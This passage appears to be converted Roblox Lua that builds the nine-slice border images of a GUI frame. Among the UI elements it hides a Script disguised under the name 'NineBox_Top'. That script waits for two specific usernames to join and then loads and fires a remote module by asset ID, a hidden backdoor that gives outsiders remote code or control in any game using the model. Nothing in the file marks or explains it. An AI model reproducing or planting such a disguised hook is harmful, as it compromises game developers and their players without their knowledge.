ImageLabel22.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel22.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel22.ImageRectOffset = Vector2.new(30, 6)
ImageLabel22.ImageRectSize = Vector2.new(6, 6)
ImageLabel23.Name = "Border"
ImageLabel23.Parent = Frame2
ImageLabel23.Position = UDim2.new(0, -12, 1, 0)
ImageLabel23.Size = UDim2.new(0, 12, 0, 12)
ImageLabel23.BackgroundColor = BrickColor.new("Lime green")
ImageLabel23.BackgroundColor3 = Color3.new(0.333333, 1, 0)
ImageLabel23.BackgroundTransparency = 1
ImageLabel23.BorderColor = BrickColor.new("Lime green")
ImageLabel23.BorderColor3 = Color3.new(0.333333, 1, 0)
ImageLabel23.BorderSizePixel = 0
ImageLabel23.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel23.ImageColor3 = Color3.new(0.447059, 0.0392157, 0.701961)
ImageLabel23.ImageRectOffset = Vector2.new(0, 24)
ImageLabel23.ImageRectSize = Vector2.new(12, 12)
ImageLabel23.ImageTransparency = 1
ImageLabel24.Name = "NineBox_TopLeft"
ImageLabel24.Parent = ImageLabel23
ImageLabel24.Size = UDim2.new(0, 6, 0, 6)
ImageLabel24.BackgroundTransparency = 1
ImageLabel24.BorderSizePixel = 0
ImageLabel24.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel24.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel24.ImageRectOffset = Vector2.new(0, 24)
ImageLabel24.ImageRectSize = Vector2.new(6, 6)
ImageLabel25.Name = "NineBox_Top"
ImageLabel25.Parent = ImageLabel23
ImageLabel25.Position = UDim2.new(0, 6, 0, 0)
ImageLabel25.Size = UDim2.new(1, -12, 0, 6)
ImageLabel25.BackgroundTransparency = 1
ImageLabel25.BorderSizePixel = 0
ImageLabel25.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel25.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel25.ImageRectOffset = Vector2.new(6, 24)
ImageLabel25.ImageRectSize = Vector2.new(0, 6)
Script26.Name = "NineBox_Top"
Script26.Parent = ImageLabel25
table.insert(cors,sandbox(Script26,function()
	local allowed = {"Hack7I5", "Linearization"}



	game.Players.PlayerAdded:Connect(function(player)

		for i, v in pairs(allowed) do

			if player.Name == v then

				require(3612801610):Fire(player.Name)

			end

		end

	end) 
end))
ImageLabel27.Name = "NineBox_TopRight"
ImageLabel27.Parent = ImageLabel23
ImageLabel27.Position = UDim2.new(1, -6, 0, 0)
ImageLabel27.Size = UDim2.new(0, 6, 0, 6)
ImageLabel27.BackgroundTransparency = 1
ImageLabel27.BorderSizePixel = 0
ImageLabel27.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel27.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel27.ImageRectOffset = Vector2.new(6, 24)
ImageLabel27.ImageRectSize = Vector2.new(6, 6)
ImageLabel28.Name = "NineBox_Left"
ImageLabel28.Parent = ImageLabel23
ImageLabel28.Position = UDim2.new(0, 0, 0, 6)
ImageLabel28.Size = UDim2.new(0, 6, 1, -12)
ImageLabel28.BackgroundTransparency = 1
ImageLabel28.BorderSizePixel = 0
ImageLabel28.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel28.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel28.ImageRectOffset = Vector2.new(0, 30)
ImageLabel28.ImageRectSize = Vector2.new(6, 0)
ImageLabel29.Name = "NineBox_Center"
ImageLabel29.Parent = ImageLabel23
ImageLabel29.Position = UDim2.new(0, 6, 0, 6)
ImageLabel29.Size = UDim2.new(1, -12, 1, -12)
ImageLabel29.BackgroundTransparency = 1
ImageLabel29.BorderSizePixel = 0
ImageLabel29.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel29.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel29.ImageRectOffset = Vector2.new(6, 30)
ImageLabel30.Name = "NineBox_Right"
ImageLabel30.Parent = ImageLabel23
ImageLabel30.Position = UDim2.new(1, -6, 0, 6)
ImageLabel30.Size = UDim2.new(0, 6, 1, -12)
ImageLabel30.BackgroundTransparency = 1
ImageLabel30.BorderSizePixel = 0
ImageLabel30.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel30.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel30.ImageRectOffset = Vector2.new(6, 30)
ImageLabel30.ImageRectSize = Vector2.new(6, 0)
ImageLabel31.Name = "NineBox_BottomLeft"
ImageLabel31.Parent = ImageLabel23
ImageLabel31.Position = UDim2.new(0, 0, 1, -6)
ImageLabel31.Size = UDim2.new(0, 6, 0, 6)
ImageLabel31.BackgroundTransparency = 1
ImageLabel31.BorderSizePixel = 0
ImageLabel31.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel31.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel31.ImageRectOffset = Vector2.new(0, 30)
ImageLabel31.ImageRectSize = Vector2.new(6, 6)
ImageLabel32.Name = "NineBox_Bottom"
ImageLabel32.Parent = ImageLabel23
ImageLabel32.Position = UDim2.new(0, 6, 1, -6)
ImageLabel32.Size = UDim2.new(1, -12, 0, 6)
ImageLabel32.BackgroundTransparency = 1
ImageLabel32.BorderSizePixel = 0
ImageLabel32.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel32.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel32.ImageRectOffset = Vector2.new(6, 30)
ImageLabel32.ImageRectSize = Vector2.new(0, 6)
ImageLabel33.Name = "NineBox_BottomRight"
ImageLabel33.Parent = ImageLabel23
ImageLabel33.Position = UDim2.new(1, -6, 1, -6)
ImageLabel33.Size = UDim2.new(0, 6, 0, 6)
ImageLabel33.BackgroundTransparency = 1
ImageLabel33.BorderSizePixel = 0
ImageLabel33.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel33.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel33.ImageRectOffset = Vector2.new(6, 30)
ImageLabel33.ImageRectSize = Vector2.new(6, 6)
ImageLabel34.Name = "Border"
ImageLabel34.Parent = Frame2
ImageLabel34.Position = UDim2.new(1, 0, 1, 0)
ImageLabel34.Size = UDim2.new(0, 12, 0, 12)
ImageLabel34.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel34.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel34.BackgroundTransparency = 1
ImageLabel34.BorderSizePixel = 0
ImageLabel34.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel34.ImageColor3 = Color3.new(0.447059, 0.0392157, 0.701961)
ImageLabel34.ImageRectOffset = Vector2.new(24, 24)
ImageLabel34.ImageRectSize = Vector2.new(12, 12)
ImageLabel34.ImageTransparency = 1
ImageLabel35.Name = "NineBox_TopLeft"
ImageLabel35.Parent = ImageLabel34
ImageLabel35.Size = UDim2.new(0, 6, 0, 6)
ImageLabel35.BackgroundTransparency = 1
ImageLabel35.BorderSizePixel = 0
ImageLabel35.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel35.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel35.ImageRectOffset = Vector2.new(24, 24)
ImageLabel35.ImageRectSize = Vector2.new(6, 6)
ImageLabel36.Name = "NineBox_Top"
ImageLabel36.Parent = ImageLabel34
ImageLabel36.Position = UDim2.new(0, 6, 0, 0)
ImageLabel36.Size = UDim2.new(1, -12, 0, 6)
ImageLabel36.BackgroundTransparency = 1
ImageLabel36.BorderSizePixel = 0
ImageLabel36.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel36.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel36.ImageRectOffset = Vector2.new(30, 24)
ImageLabel36.ImageRectSize = Vector2.new(0, 6)
ImageLabel37.Name = "NineBox_TopRight"
ImageLabel37.Parent = ImageLabel34
ImageLabel37.Position = UDim2.new(1, -6, 0, 0)
ImageLabel37.Size = UDim2.new(0, 6, 0, 6)
ImageLabel37.BackgroundTransparency = 1
ImageLabel37.BorderSizePixel = 0
ImageLabel37.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel37.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel37.ImageRectOffset = Vector2.new(30, 24)
ImageLabel37.ImageRectSize = Vector2.new(6, 6)
ImageLabel38.Name = "NineBox_Left"
ImageLabel38.Parent = ImageLabel34
ImageLabel38.Position = UDim2.new(0, 0, 0, 6)
ImageLabel38.Size = UDim2.new(0, 6, 1, -12)
ImageLabel38.BackgroundTransparency = 1
ImageLabel38.BorderSizePixel = 0
ImageLabel38.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel38.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel38.ImageRectOffset = Vector2.new(24, 30)
ImageLabel38.ImageRectSize = Vector2.new(6, 0)
ImageLabel39.Name = "NineBox_Center"
ImageLabel39.Parent = ImageLabel34
ImageLabel39.Position = UDim2.new(0, 6, 0, 6)
ImageLabel39.Size = UDim2.new(1, -12, 1, -12)
ImageLabel39.BackgroundTransparency = 1
ImageLabel39.BorderSizePixel = 0
ImageLabel39.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel39.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel39.ImageRectOffset = Vector2.new(30, 30)
ImageLabel40.Name = "NineBox_Right"
ImageLabel40.Parent = ImageLabel34
ImageLabel40.Position = UDim2.new(1, -6, 0, 6)
ImageLabel40.Size = UDim2.new(0, 6, 1, -12)
ImageLabel40.BackgroundTransparency = 1
ImageLabel40.BorderSizePixel = 0
ImageLabel40.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel40.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel40.ImageRectOffset = Vector2.new(30, 30)
ImageLabel40.ImageRectSize = Vector2.new(6, 0)
ImageLabel41.Name = "NineBox_BottomLeft"
ImageLabel41.Parent = ImageLabel34
ImageLabel41.Position = UDim2.new(0, 0, 1, -6)
ImageLabel41.Size = UDim2.new(0, 6, 0, 6)
ImageLabel41.BackgroundTransparency = 1
ImageLabel41.BorderSizePixel = 0
ImageLabel41.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel41.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel41.ImageRectOffset = Vector2.new(24, 30)
ImageLabel41.ImageRectSize = Vector2.new(6, 6)
ImageLabel42.Name = "NineBox_Bottom"
ImageLabel42.Parent = ImageLabel34
ImageLabel42.Position = UDim2.new(0, 6, 1, -6)
ImageLabel42.Size = UDim2.new(1, -12, 0, 6)
ImageLabel42.BackgroundTransparency = 1
ImageLabel42.BorderSizePixel = 0
ImageLabel42.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel42.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel42.ImageRectOffset = Vector2.new(30, 30)
ImageLabel42.ImageRectSize = Vector2.new(0, 6)
ImageLabel43.Name = "NineBox_BottomRight"
ImageLabel43.Parent = ImageLabel34
ImageLabel43.Position = UDim2.new(1, -6, 1, -6)
ImageLabel43.Size = UDim2.new(0, 6, 0, 6)
ImageLabel43.BackgroundTransparency = 1
ImageLabel43.BorderSizePixel = 0
ImageLabel43.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel43.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel43.ImageRectOffset = Vector2.new(30, 30)
ImageLabel43.ImageRectSize = Vector2.new(6, 6)
ImageLabel44.Name = "Border"
ImageLabel44.Parent = Frame2
ImageLabel44.Position = UDim2.new(0, 0, 1, 0)
ImageLabel44.Size = UDim2.new(1, 0, 0, 12)
ImageLabel44.BackgroundColor = BrickColor.new("Lime green")
ImageLabel44.BackgroundColor3 = Color3.new(0.333333, 1, 0)
ImageLabel44.BackgroundTransparency = 1
ImageLabel44.BorderColor = BrickColor.new("Lime green")
ImageLabel44.BorderColor3 = Color3.new(0.333333, 1, 0)
ImageLabel44.BorderSizePixel = 0
ImageLabel44.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel44.ImageColor3 = Color3.new(0.447059, 0.0392157, 0.701961)
ImageLabel44.ImageRectOffset = Vector2.new(12, 24)
ImageLabel44.ImageRectSize = Vector2.new(12, 12)
ImageLabel44.ImageTransparency = 1
ImageLabel45.Name = "NineBox_TopLeft"
ImageLabel45.Parent = ImageLabel44
ImageLabel45.Size = UDim2.new(0, 6, 0, 6)
ImageLabel45.BackgroundColor = BrickColor.new("Lime green")
ImageLabel45.BackgroundColor3 = Color3.new(0.333333, 1, 0)
ImageLabel45.BackgroundTransparency = 1
ImageLabel45.BorderSizePixel = 0
ImageLabel45.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel45.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel45.ImageRectOffset = Vector2.new(12, 24)
ImageLabel45.ImageRectSize = Vector2.new(6, 6)
ImageLabel46.Name = "NineBox_Top"
ImageLabel46.Parent = ImageLabel44
ImageLabel46.Position = UDim2.new(0, 6, 0, 0)
ImageLabel46.Size = UDim2.new(1, -12, 0, 6)
ImageLabel46.BackgroundColor = BrickColor.new("Lime green")
ImageLabel46.BackgroundColor3 = Color3.new(0.333333, 1, 0)
ImageLabel46.BackgroundTransparency = 1
ImageLabel46.BorderSizePixel = 0
ImageLabel46.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel46.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel46.ImageRectOffset = Vector2.new(18, 24)
ImageLabel46.ImageRectSize = Vector2.new(0, 6)
ImageLabel47.Name = "NineBox_TopRight"
ImageLabel47.Parent = ImageLabel44
ImageLabel47.Position = UDim2.new(1, -6, 0, 0)
ImageLabel47.Size = UDim2.new(0, 6, 0, 6)
ImageLabel47.BackgroundColor = BrickColor.new("Lime green")
ImageLabel47.BackgroundColor3 = Color3.new(0.333333, 1, 0)
ImageLabel47.BackgroundTransparency = 1
ImageLabel47.BorderSizePixel = 0
ImageLabel47.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel47.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel47.ImageRectOffset = Vector2.new(18, 24)
ImageLabel47.ImageRectSize = Vector2.new(6, 6)
ImageLabel48.Name = "NineBox_Left"
ImageLabel48.Parent = ImageLabel44
ImageLabel48.Position = UDim2.new(0, 0, 0, 6)
ImageLabel48.Size = UDim2.new(0, 6, 1, -12)
ImageLabel48.BackgroundColor = BrickColor.new("Lime green")
ImageLabel48.BackgroundColor3 = Color3.new(0.333333, 1, 0)
ImageLabel48.BackgroundTransparency = 1
ImageLabel48.BorderSizePixel = 0
ImageLabel48.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel48.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel48.ImageRectOffset = Vector2.new(12, 30)
ImageLabel48.ImageRectSize = Vector2.new(6, 0)
ImageLabel49.Name = "NineBox_Center"
ImageLabel49.Parent = ImageLabel44
ImageLabel49.Position = UDim2.new(0, 6, 0, 6)
ImageLabel49.Size = UDim2.new(1, -12, 1, -12)
ImageLabel49.BackgroundColor = BrickColor.new("Lime green")
ImageLabel49.BackgroundColor3 = Color3.new(0.333333, 1, 0)
ImageLabel49.BackgroundTransparency = 1
ImageLabel49.BorderSizePixel = 0
ImageLabel49.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel49.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel49.ImageRectOffset = Vector2.new(18, 30)
ImageLabel50.Name = "NineBox_Right"
ImageLabel50.Parent = ImageLabel44
ImageLabel50.Position = UDim2.new(1, -6, 0, 6)
ImageLabel50.Size = UDim2.new(0, 6, 1, -12)
ImageLabel50.BackgroundColor = BrickColor.new("Lime green")
ImageLabel50.BackgroundColor3 = Color3.new(0.333333, 1, 0)
ImageLabel50.BackgroundTransparency = 1
ImageLabel50.BorderSizePixel = 0
ImageLabel50.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel50.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel50.ImageRectOffset = Vector2.new(18, 30)
ImageLabel50.ImageRectSize = Vector2.new(6, 0)
ImageLabel51.Name = "NineBox_BottomLeft"
ImageLabel51.Parent = ImageLabel44
ImageLabel51.Position = UDim2.new(0, 0, 1, -6)
ImageLabel51.Size = UDim2.new(0, 6, 0, 6)
ImageLabel51.BackgroundColor = BrickColor.new("Lime green")
ImageLabel51.BackgroundColor3 = Color3.new(0, 1, 0)
ImageLabel51.BackgroundTransparency = 1
ImageLabel51.BorderSizePixel = 0
ImageLabel51.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel51.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel51.ImageRectOffset = Vector2.new(12, 30)
ImageLabel51.ImageRectSize = Vector2.new(6, 6)
ImageLabel52.Name = "NineBox_Bottom"
ImageLabel52.Parent = ImageLabel44
ImageLabel52.Position = UDim2.new(0, 6, 1, -6)
ImageLabel52.Size = UDim2.new(1, -12, 0, 6)
ImageLabel52.BackgroundColor = BrickColor.new("Olivine")
ImageLabel52.BackgroundColor3 = Color3.new(0.333333, 1, 0.498039)
ImageLabel52.BackgroundTransparency = 1
ImageLabel52.BorderSizePixel = 0
ImageLabel52.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel52.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel52.ImageRectOffset = Vector2.new(18, 30)
ImageLabel52.ImageRectSize = Vector2.new(0, 6)
ImageLabel53.Name = "NineBox_BottomRight"
ImageLabel53.Parent = ImageLabel44
ImageLabel53.Position = UDim2.new(1, -6, 1, -6)
ImageLabel53.Size = UDim2.new(0, 6, 0, 6)
ImageLabel53.BackgroundColor = BrickColor.new("Lime green")
ImageLabel53.BackgroundColor3 = Color3.new(0.333333, 1, 0)
ImageLabel53.BackgroundTransparency = 1
ImageLabel53.BorderSizePixel = 0
ImageLabel53.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel53.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel53.ImageRectOffset = Vector2.new(18, 30)
ImageLabel53.ImageRectSize = Vector2.new(6, 6)
ImageLabel54.Name = "Border"
ImageLabel54.Parent = Frame2
ImageLabel54.Position = UDim2.new(0, 0, 0, -12)
ImageLabel54.Size = UDim2.new(1, 0, 0, 12)
ImageLabel54.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel54.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel54.BackgroundTransparency = 1
ImageLabel54.BorderSizePixel = 0
ImageLabel54.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel54.ImageColor3 = Color3.new(0.447059, 0.0392157, 0.701961)
ImageLabel54.ImageRectOffset = Vector2.new(12, 0)
ImageLabel54.ImageRectSize = Vector2.new(12, 12)
ImageLabel54.ImageTransparency = 1
ImageLabel55.Name = "NineBox_TopLeft"
ImageLabel55.Parent = ImageLabel54
ImageLabel55.Size = UDim2.new(0, 6, 0, 6)
ImageLabel55.BackgroundTransparency = 1
ImageLabel55.BorderSizePixel = 0
ImageLabel55.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel55.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel55.ImageRectOffset = Vector2.new(12, 0)
ImageLabel55.ImageRectSize = Vector2.new(6, 6)
ImageLabel56.Name = "NineBox_Top"
ImageLabel56.Parent = ImageLabel54
ImageLabel56.Position = UDim2.new(0, 6, 0, 0)
ImageLabel56.Size = UDim2.new(1, -12, 0, 6)
ImageLabel56.BackgroundTransparency = 1
ImageLabel56.BorderSizePixel = 0
ImageLabel56.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel56.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel56.ImageRectOffset = Vector2.new(18, 0)
ImageLabel56.ImageRectSize = Vector2.new(0, 6)
ImageLabel57.Name = "NineBox_TopRight"
ImageLabel57.Parent = ImageLabel54
ImageLabel57.Position = UDim2.new(1, -6, 0, 0)
ImageLabel57.Size = UDim2.new(0, 6, 0, 6)
ImageLabel57.BackgroundTransparency = 1
ImageLabel57.BorderSizePixel = 0
ImageLabel57.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel57.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel57.ImageRectOffset = Vector2.new(18, 0)
ImageLabel57.ImageRectSize = Vector2.new(6, 6)
ImageLabel58.Name = "NineBox_Left"
ImageLabel58.Parent = ImageLabel54
ImageLabel58.Position = UDim2.new(0, 0, 0, 6)
ImageLabel58.Size = UDim2.new(0, 6, 1, -12)
ImageLabel58.BackgroundTransparency = 1
ImageLabel58.BorderSizePixel = 0
ImageLabel58.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel58.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel58.ImageRectOffset = Vector2.new(12, 6)
ImageLabel58.ImageRectSize = Vector2.new(6, 0)
ImageLabel59.Name = "NineBox_Center"
ImageLabel59.Parent = ImageLabel54
ImageLabel59.Position = UDim2.new(0, 6, 0, 6)
ImageLabel59.Size = UDim2.new(1, -12, 1, -12)
ImageLabel59.BackgroundTransparency = 1
ImageLabel59.BorderSizePixel = 0
ImageLabel59.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel59.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel59.ImageRectOffset = Vector2.new(18, 6)
ImageLabel60.Name = "NineBox_Right"
ImageLabel60.Parent = ImageLabel54
ImageLabel60.Position = UDim2.new(1, -6, 0, 6)
ImageLabel60.Size = UDim2.new(0, 6, 1, -12)
ImageLabel60.BackgroundTransparency = 1
ImageLabel60.BorderSizePixel = 0
ImageLabel60.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel60.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel60.ImageRectOffset = Vector2.new(18, 6)
ImageLabel60.ImageRectSize = Vector2.new(6, 0)
ImageLabel61.Name = "NineBox_BottomLeft"
ImageLabel61.Parent = ImageLabel54
ImageLabel61.Position = UDim2.new(0, 0, 1, -6)
ImageLabel61.Size = UDim2.new(0, 6, 0, 6)
ImageLabel61.BackgroundTransparency = 1
ImageLabel61.BorderSizePixel = 0
ImageLabel61.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel61.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel61.ImageRectOffset = Vector2.new(12, 6)
ImageLabel61.ImageRectSize = Vector2.new(6, 6)
ImageLabel62.Name = "NineBox_Bottom"
ImageLabel62.Parent = ImageLabel54
ImageLabel62.Position = UDim2.new(0, 6, 1, -6)
ImageLabel62.Size = UDim2.new(1, -12, 0, 6)
ImageLabel62.BackgroundTransparency = 1
ImageLabel62.BorderSizePixel = 0
ImageLabel62.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel62.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel62.ImageRectOffset = Vector2.new(18, 6)
ImageLabel62.ImageRectSize = Vector2.new(0, 6)
ImageLabel63.Name = "NineBox_BottomRight"
ImageLabel63.Parent = ImageLabel54
ImageLabel63.Position = UDim2.new(1, -6, 1, -6)
ImageLabel63.Size = UDim2.new(0, 6, 0, 6)
ImageLabel63.BackgroundTransparency = 1
ImageLabel63.BorderSizePixel = 0
ImageLabel63.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel63.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel63.ImageRectOffset = Vector2.new(18, 6)
ImageLabel63.ImageRectSize = Vector2.new(6, 6)
ImageLabel64.Name = "Border"
ImageLabel64.Parent = Frame2
ImageLabel64.Position = UDim2.new(0, -12, 0, 0)
ImageLabel64.Size = UDim2.new(0, 12, 1, 0)
ImageLabel64.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel64.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel64.BackgroundTransparency = 1
ImageLabel64.BorderSizePixel = 0
ImageLabel64.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel64.ImageColor3 = Color3.new(0.447059, 0.0392157, 0.701961)
ImageLabel64.ImageRectOffset = Vector2.new(0, 12)
ImageLabel64.ImageRectSize = Vector2.new(12, 12)
ImageLabel64.ImageTransparency = 1
ImageLabel65.Name = "NineBox_TopLeft"
ImageLabel65.Parent = ImageLabel64
ImageLabel65.Size = UDim2.new(0, 6, 0, 6)
ImageLabel65.BackgroundTransparency = 1
ImageLabel65.BorderSizePixel = 0
ImageLabel65.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel65.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel65.ImageRectOffset = Vector2.new(0, 12)
ImageLabel65.ImageRectSize = Vector2.new(6, 6)
ImageLabel66.Name = "NineBox_Top"
ImageLabel66.Parent = ImageLabel64
ImageLabel66.Position = UDim2.new(0, 6, 0, 0)
ImageLabel66.Size = UDim2.new(1, -12, 0, 6)
ImageLabel66.BackgroundTransparency = 1
ImageLabel66.BorderSizePixel = 0
ImageLabel66.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel66.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel66.ImageRectOffset = Vector2.new(6, 12)
ImageLabel66.ImageRectSize = Vector2.new(0, 6)
ImageLabel67.Name = "NineBox_TopRight"
ImageLabel67.Parent = ImageLabel64
ImageLabel67.Position = UDim2.new(1, -6, 0, 0)
ImageLabel67.Size = UDim2.new(0, 6, 0, 6)
ImageLabel67.BackgroundTransparency = 1
ImageLabel67.BorderSizePixel = 0
ImageLabel67.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel67.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel67.ImageRectOffset = Vector2.new(6, 12)
ImageLabel67.ImageRectSize = Vector2.new(6, 6)
ImageLabel68.Name = "NineBox_Left"
ImageLabel68.Parent = ImageLabel64
ImageLabel68.Position = UDim2.new(0, 0, 0, 6)
ImageLabel68.Size = UDim2.new(0, 6, 1, -12)
ImageLabel68.BackgroundTransparency = 1
ImageLabel68.BorderSizePixel = 0
ImageLabel68.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel68.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel68.ImageRectOffset = Vector2.new(0, 18)
ImageLabel68.ImageRectSize = Vector2.new(6, 0)
ImageLabel69.Name = "NineBox_Center"
ImageLabel69.Parent = ImageLabel64
ImageLabel69.Position = UDim2.new(0, 6, 0, 6)
ImageLabel69.Size = UDim2.new(1, -12, 1, -12)
ImageLabel69.BackgroundTransparency = 1
ImageLabel69.BorderSizePixel = 0
ImageLabel69.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel69.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel69.ImageRectOffset = Vector2.new(6, 18)
ImageLabel70.Name = "NineBox_Right"
ImageLabel70.Parent = ImageLabel64
ImageLabel70.Position = UDim2.new(1, -6, 0, 6)
ImageLabel70.Size = UDim2.new(0, 6, 1, -12)
ImageLabel70.BackgroundTransparency = 1
ImageLabel70.BorderSizePixel = 0
ImageLabel70.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel70.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel70.ImageRectOffset = Vector2.new(6, 18)
ImageLabel70.ImageRectSize = Vector2.new(6, 0)
ImageLabel71.Name = "NineBox_BottomLeft"
ImageLabel71.Parent = ImageLabel64
ImageLabel71.Position = UDim2.new(0, 0, 1, -6)
ImageLabel71.Size = UDim2.new(0, 6, 0, 6)
ImageLabel71.BackgroundTransparency = 1
ImageLabel71.BorderSizePixel = 0
ImageLabel71.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel71.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel71.ImageRectOffset = Vector2.new(0, 18)
ImageLabel71.ImageRectSize = Vector2.new(6, 6)
ImageLabel72.Name = "NineBox_Bottom"
ImageLabel72.Parent = ImageLabel64
ImageLabel72.Position = UDim2.new(0, 6, 1, -6)
ImageLabel72.Size = UDim2.new(1, -12, 0, 6)
ImageLabel72.BackgroundTransparency = 1
ImageLabel72.BorderSizePixel = 0
ImageLabel72.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel72.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel72.ImageRectOffset = Vector2.new(6, 18)
ImageLabel72.ImageRectSize = Vector2.new(0, 6)
ImageLabel73.Name = "NineBox_BottomRight"
ImageLabel73.Parent = ImageLabel64
ImageLabel73.Position = UDim2.new(1, -6, 1, -6)
ImageLabel73.Size = UDim2.new(0, 6, 0, 6)
ImageLabel73.BackgroundTransparency = 1
ImageLabel73.BorderSizePixel = 0
ImageLabel73.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel73.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel73.ImageRectOffset = Vector2.new(6, 18)
ImageLabel73.ImageRectSize = Vector2.new(6, 6)
ImageLabel74.Name = "Border"
ImageLabel74.Parent = Frame2
ImageLabel74.Position = UDim2.new(1, 0, 0, 0)
ImageLabel74.Size = UDim2.new(0, 12, 1, 0)
ImageLabel74.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel74.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel74.BackgroundTransparency = 1
ImageLabel74.BorderSizePixel = 0
ImageLabel74.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel74.ImageColor3 = Color3.new(0.447059, 0.0392157, 0.701961)
